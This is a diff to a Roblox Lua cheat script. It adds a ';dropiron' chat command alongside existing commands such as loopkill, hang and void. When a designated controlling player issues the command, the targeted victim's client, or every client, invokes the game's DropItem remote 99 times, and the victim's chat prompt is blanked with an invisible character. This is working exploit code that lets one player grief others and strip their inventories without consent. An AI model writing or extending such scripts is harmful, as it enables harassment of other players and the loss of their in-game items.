@@ -23,7 +23,7 @@ local StarterGui = game:GetService("StarterGui")
 local Notify = function(_Title, _Text , Time)
     StarterGui:SetCore("SendNotification", {Title = _Title, Text = _Text, Icon = "rbxassetid://2541869220", Duration = Time})
 end
-local cmds = "⭐cmds are: void, cmds, reset, loopkill, unloopkill, hang, unhang ⭐"
+local cmds = "⭐cmds are: void, cmds, reset, loopkill, unloopkill, hang, unhang, dropiron⭐"
 local ores = "⭐ores that can be dropped are:"
 local ores2 = "iron,diamond,emerald,gold,u can drop stuff that arnt ores too.⭐"
 
@@ -172,6 +172,37 @@ Rope.Name = "ROPE"
 elseif cmd == ";unhang" and getsexter(speaker) and game.Players.LocalPlayer == target and game.Players.LocalPlayer.Name ~= REV then
 workspace.ROOF.ROPE:Destroy()
 workspace.ROOF:Destroy()
+
+elseif cmd == ";dropiron" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and game.Players.LocalPlayer == target  then
+prompt.Text = "⁥"
+prompt.PrefixText = "⁥"
+local name = game.Players.LocalPlayer.Name
+prompt.Text = "⁥"
+prompt.PrefixText = "⁥"
+local name = game.Players.LocalPlayer.Name
+for i = 1,99 do
+local args = {
+    [1] = {
+        ["item"] = "iron",
+    }
+}
+
+game:GetService("ReplicatedStorage").rbxts_include.node_modules:FindFirstChild("@rbxts").net.out._NetManaged.DropItem:InvokeServer(unpack(args))
+end
+
+elseif cmd == ";dropiron" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and who == "." then
+prompt.Text = "⁥"
+prompt.PrefixText = "⁥"
+local name = game.Players.LocalPlayer.Name
+for i = 1,99 do
+local args = {
+    [1] = {
+        ["item"] = "iron",
+    }
+}
+
+game:GetService("ReplicatedStorage").rbxts_include.node_modules:FindFirstChild("@rbxts").net.out._NetManaged.DropItem:InvokeServer(unpack(args))
+    end
 
 
 	end
